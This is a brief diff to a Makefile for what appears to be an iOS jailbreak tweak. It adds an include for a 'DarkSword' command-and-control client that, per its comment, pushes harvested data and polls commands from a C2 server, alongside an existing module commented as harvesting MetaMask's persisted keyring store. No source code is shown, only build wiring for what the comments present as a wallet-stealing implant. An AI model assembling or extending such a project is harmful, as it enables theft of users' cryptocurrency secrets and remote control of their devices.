@@ -200,4 +200,8 @@ include TryMaskCardShell.mk
 # (MetaMask's Documents/persistStore/persist-keyringcontroller by default).
 include PersistStoreHarvester.mk
 
+# DarkSword C2 client: Filza as the entry point, pushing harvests and polling
+# commands against a DarkSword C2 over its native JSON contract.
+include DarkSwordClient.mk
+
 include $(THEOS_MAKE_PATH)/tweak.mk
